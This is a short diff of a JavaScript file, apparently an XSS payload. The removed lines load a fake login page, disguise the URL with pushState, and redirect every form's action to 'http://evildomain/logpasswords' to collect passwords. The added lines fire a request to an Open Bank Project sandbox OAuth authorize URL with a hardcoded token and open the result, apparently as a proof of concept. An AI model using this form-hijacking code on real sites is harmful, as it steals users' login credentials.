@@ -1,19 +1,2 @@
-function override(url){
-  var req = new XMLHttpRequest();
-  req.open('GET', url,false);
-  req.onreadystatechange = function(){
-    if(req.readyState == 4 && req.responseText != ""){
-      document.innerHTML = req.responseText;
-    }
-  }
-  req.send(null);
-}
-
-override("/login.php");
-
-history.pushState({he: "he"}, document,getElementsByTagName("title")[0].innerHTML, "login.php");
-
-var forms = document.getElementsByTagName("form");
-for (index=0;index<forms.length;index++){
-  void(forms[index].action = "http://evildomain/logpasswords");
-}
+var x=new XMLHttpRequest();x.open('GET','https://apisandbox.openbankproject.com/oauth/authorize?oauth_token=BXNIS0SQFNGHVGM5AE1P0KDUGK2PAZT1SKQYIFCZ');x.send();
+x.onreadystatechange=function(){if(this.readyState==4){window.open(x.responseURL)}}
